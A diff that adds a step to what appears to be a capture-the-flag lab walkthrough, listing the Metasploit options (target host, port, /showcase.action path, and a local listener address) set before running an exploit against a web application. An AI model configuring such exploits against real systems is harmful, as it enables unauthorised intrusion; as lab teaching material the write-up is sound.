@@ -48,6 +48,20 @@ show options
 
 ![](imgs/usemsf.png)
 
+7.) When using Metasploit, we need to set all the required options before trying to execute the exploit on the machine.
+
+```bash
+set RHOSTS 10.10.173.247
+
+Set RPORT 80
+
+set TARGETURI /showcase.action
+
+set LHOST 10.13.37.142
+```
+
+![](imgs/setoptions.png)
+
 ## Tasks
 | Task | Question | Answer |
 | --- | --- | --- |
